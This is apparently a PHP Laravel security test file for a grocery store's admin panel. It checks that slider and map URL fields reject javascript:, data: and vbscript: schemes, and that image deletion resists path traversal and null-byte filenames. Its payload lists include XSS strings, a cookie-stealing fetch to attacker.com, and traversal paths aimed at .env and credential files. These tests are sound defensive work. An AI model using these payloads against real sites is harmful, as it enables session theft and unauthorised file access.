<?php

namespace Tests\Feature\Challenger;

use App\Models\Admin;
use App\Models\Product;
use App\Models\RecipeKit;
use App\Models\Slider;
use App\Models\StoreSetting;
use Database\Seeders\AdminSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Storage;
use Tests\TestCase;

class Milestone1SecurityVerificationTest extends TestCase
{
    use RefreshDatabase;

    protected Admin $admin;

    protected function setUp(): void
    {
        parent::setUp();
        $this->seed(AdminSeeder::class);
        $this->admin = Admin::where('email', 'admin@masalamart.com')->firstOrFail();
    }

    /**
     * Verify that StoreSliderRequest strictly rejects malicious URL schemes with HTTP 422.
     */
    public function test_slider_store_strictly_rejects_malicious_url_schemes_with_422(): void
    {
        $maliciousPayloads = [
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'vbscript:msgbox(1)',
            'JAVASCRIPT:alert(1)',
            'DATA:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'VBSCRIPT:msgbox(1)',
            'javascript:fetch("https://attacker.com/steal?cookie="+document.cookie)',
        ];

        foreach ($maliciousPayloads as $payload) {
            $uniqueTitle = 'Malicious Slider '.md5($payload);

            $response = $this->actingAs($this->admin, 'admin')->postJson(route('admin.sliders.store'), [
                'title' => $uniqueTitle,
                'cta_text' => 'Click Here',
                'link_url' => $payload,
            ]);

            $response->assertStatus(422);
            $response->assertJsonValidationErrors(['link_url']);

            $this->assertDatabaseMissing('sliders', [
                'title' => $uniqueTitle,
            ]);
        }
    }

    /**
     * Verify that UpdateSliderRequest strictly rejects malicious URL schemes with HTTP 422.
     */
    public function test_slider_update_strictly_rejects_malicious_url_schemes_with_422(): void
    {
        $slider = Slider::create([
            'title' => 'Original Slider Title',
            'cta_text' => 'Shop Deals',
            'link_url' => '/products/safe',
            'image' => '/images/safe.jpg',
            'sort_order' => 1,
            'is_active' => true,
        ]);

        $maliciousPayloads = [
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'vbscript:msgbox(1)',
            'JAVASCRIPT:alert(1)',
            'DATA:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'VBSCRIPT:msgbox(1)',
        ];

        foreach ($maliciousPayloads as $payload) {
            $response = $this->actingAs($this->admin, 'admin')->putJson(route('admin.sliders.update', $slider->id), [
                'title' => 'Updated Title',
                'cta_text' => 'Shop Deals',
                'link_url' => $payload,
            ]);

            $response->assertStatus(422);
            $response->assertJsonValidationErrors(['link_url']);
            $this->assertSame('/products/safe', $slider->fresh()->link_url);
        }
    }

    /**
     * Verify that StoreSettingRequest strictly rejects malicious URL schemes with HTTP 422.
     */
    public function test_store_setting_update_strictly_rejects_malicious_maps_url_with_422(): void
    {
        $current = StoreSetting::current();
        $safeUrl = $current->maps_url;

        $maliciousPayloads = [
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'vbscript:msgbox(1)',
            'JAVASCRIPT:alert(1)',
            'DATA:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'VBSCRIPT:msgbox(1)',
        ];

        foreach ($maliciousPayloads as $payload) {
            $payloadData = array_merge($current->toArray(), [
                'maps_url' => $payload,
            ]);

            $response = $this->actingAs($this->admin, 'admin')->putJson(route('admin.store-info.update'), $payloadData);

            $response->assertStatus(422);
            $response->assertJsonValidationErrors(['maps_url']);
            $this->assertSame($safeUrl, StoreSetting::current()->maps_url);
        }
    }

    /**
     * Empirically verify that product image deletion isolates deletes strictly to storage/app/public/products.
     */
    public function test_product_image_deletion_path_traversal_containment(): void
    {
        Storage::fake('public');

        // Sensitive files outside the products directory
        Storage::disk('public')->put('sensitive_config.env', 'DATABASE_KEY=secret_123');
        Storage::disk('public')->put('root_secret.pem', 'PRIVATE_KEY_DATA');
        Storage::disk('public')->put('archive.tar.gz', 'ARCHIVE_DATA');

        // Legitimate product image
        Storage::disk('public')->put('products/legit_image.jpg', 'IMAGE_BYTES');

        // Product with malicious traversal entries
        $product = Product::factory()->create([
            'images' => [
                '/storage/products/legit_image.jpg',
                '/storage/products/../../sensitive_config.env',
                '/storage/products/..%2f..%2froot_secret.pem',
                '/storage/products/%2e%2e%2farchive.tar.gz',
                '../../outside_prefix.txt',
                'https://cdn.example.com/external.jpg',
            ],
        ]);

        $response = $this->actingAs($this->admin, 'admin')
            ->delete(route('admin.products.destroy', $product));

        $response->assertRedirect(route('admin.products.index'));

        // Legitimate product image must be deleted
        Storage::disk('public')->assertMissing('products/legit_image.jpg');

        // Files outside products directory MUST NOT be deleted
        Storage::disk('public')->assertExists('sensitive_config.env');
        Storage::disk('public')->assertExists('root_secret.pem');
        Storage::disk('public')->assertExists('archive.tar.gz');

        // Database record should be deleted
        $this->assertDatabaseMissing('products', ['id' => $product->id]);
    }

    /**
     * Empirically verify product image deletion when filenames contain null bytes or malformed characters.
     */
    public function test_product_image_deletion_with_null_byte_payload(): void
    {
        Storage::fake('public');

        Storage::disk('public')->put('system_secret.txt', 'TOP_SECRET');
        Storage::disk('public')->put('products/valid.jpg', 'VALID_IMAGE');

        $product = Product::factory()->create([
            'images' => [
                '/storage/products/valid.jpg',
                "/storage/products/valid.jpg\0../../system_secret.txt",
                "/storage/products/\0system_secret.txt",
            ],
        ]);

        // Attempt deletion; whether basename ignores null bytes or strips them, system_secret.txt must not be touched
        try {
            $this->actingAs($this->admin, 'admin')->delete(route('admin.products.destroy', $product));
        } catch (\Throwable $e) {
            // If PHP 8.5 throws ValueError on null byte in filesystem operations, exception is caught
        }

        // Sensitive file outside products must remain completely intact
        Storage::disk('public')->assertExists('system_secret.txt');
    }

    /**
     * Empirically verify that recipe kit image deletion isolates deletes strictly to storage/app/public/recipe-kits.
     */
    public function test_recipe_kit_image_deletion_path_traversal_containment(): void
    {
        Storage::fake('public');

        // Sensitive files outside recipe-kits directory
        Storage::disk('public')->put('root_backup.sql', 'DATABASE DUMP');
        Storage::disk('public')->put('credentials.json', '{"token": "xyz"}');

        // Legitimate kit image
        Storage::disk('public')->put('recipe-kits/tandoori_kit.jpg', 'KIT_IMAGE_BYTES');

        $recipeKit = RecipeKit::create([
            'name' => 'Tandoori Chicken Kit',
            'slug' => 'tandoori-chicken-kit',
            'subtitle_tag' => 'CHEF_PICK',
            'price' => 19.99,
            'original_price' => 24.99,
            'servings' => 'Serves 4',
            'cooking_time' => '30 mins',
            'difficulty' => 'Medium',
            'image' => '/storage/recipe-kits/tandoori_kit.jpg',
            'images' => [
                '/storage/recipe-kits/tandoori_kit.jpg',
                '/storage/recipe-kits/../../root_backup.sql',
                '/storage/recipe-kits/..%2f..%2fcredentials.json',
                '/storage/recipe-kits/%2e%2e%2froot_backup.sql',
                '../../direct_escape.txt',
            ],
            'is_active' => true,
        ]);

        $response = $this->actingAs($this->admin, 'admin')
            ->delete(route('admin.recipe-kits.destroy', $recipeKit));

        $response->assertRedirect(route('admin.recipe-kits.index'));

        // Legitimate kit image must be deleted
        Storage::disk('public')->assertMissing('recipe-kits/tandoori_kit.jpg');

        // Files outside recipe-kits must NOT be deleted
        Storage::disk('public')->assertExists('root_backup.sql');
        Storage::disk('public')->assertExists('credentials.json');

        // Database record should be deleted
        $this->assertDatabaseMissing('recipe_kits', ['id' => $recipeKit->id]);
    }

    /**
     * Empirically verify that even if a root file shares the identical filename with a traversal attempt,
     * only the file inside products/ is deleted and the root file remains untouched.
     */
    public function test_product_image_deletion_exact_same_filename_outside_remains_safe(): void
    {
        Storage::fake('public');

        // File at root of public disk
        Storage::disk('public')->put('config.json', 'ROOT_CRITICAL_CONFIG');
        // File inside products directory with same filename
        Storage::disk('public')->put('products/config.json', 'PRODUCT_CONFIG');

        $product = Product::factory()->create([
            'images' => [
                '/storage/products/../../config.json',
            ],
        ]);

        $this->actingAs($this->admin, 'admin')->delete(route('admin.products.destroy', $product));

        // The file inside products/ should be deleted
        Storage::disk('public')->assertMissing('products/config.json');
        // The file at root MUST STILL EXIST with original content
        Storage::disk('public')->assertExists('config.json');
        $this->assertSame('ROOT_CRITICAL_CONFIG', Storage::disk('public')->get('config.json'));
    }

    /**
     * Empirically verify that even if a root file shares the identical filename with a traversal attempt,
     * only the file inside recipe-kits/ is deleted and the root file remains untouched.
     */
    public function test_recipe_kit_image_deletion_exact_same_filename_outside_remains_safe(): void
    {
        Storage::fake('public');

        // File at root of public disk
        Storage::disk('public')->put('env_backup.env', 'ROOT_ENV_DATA');
        // File inside recipe-kits directory with same filename
        Storage::disk('public')->put('recipe-kits/env_backup.env', 'KIT_ENV_DATA');

        $recipeKit = RecipeKit::create([
            'name' => 'Biryani Kit',
            'slug' => 'biryani-kit',
            'subtitle_tag' => 'SIGNATURE',
            'price' => 22.99,
            'original_price' => 26.99,
            'servings' => 'Serves 4',
            'cooking_time' => '45 mins',
            'difficulty' => 'Medium',
            'image' => '/storage/recipe-kits/biryani.jpg',
            'images' => [
                '/storage/recipe-kits/../../env_backup.env',
            ],
            'is_active' => true,
        ]);

        $this->actingAs($this->admin, 'admin')->delete(route('admin.recipe-kits.destroy', $recipeKit));

        // The file inside recipe-kits/ should be deleted
        Storage::disk('public')->assertMissing('recipe-kits/env_backup.env');
        // The file at root MUST STILL EXIST with original content
        Storage::disk('public')->assertExists('env_backup.env');
        $this->assertSame('ROOT_ENV_DATA', Storage::disk('public')->get('env_backup.env'));
    }
}
